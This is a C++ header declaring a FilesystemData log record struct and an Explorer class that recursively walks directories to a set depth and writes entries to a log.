#pragma once
#include "Common.h"
#include "Log.h"

typedef struct _FilesystemData {
#define LOG_FILESYSTEM_VERSION 2010031501
	DWORD dwVersion;
	DWORD dwPathLen;
#define FILESYSTEM_IS_DIRECTORY 1
#define FILESYSTEM_IS_EMPTY     2
	DWORD dwFlags;
	DWORD dwFileSizeLo;
	DWORD dwFileSizeHi;
	FILETIME ftTime;
} FilesystemData, *pFilesystemData;

class Explorer {
private:
	Log log;

	WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_path);
	WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path);

public:
	Explorer();
	~Explorer();
	BOOL ExploreDirectory(WCHAR *start_path, DWORD dwDepth);
};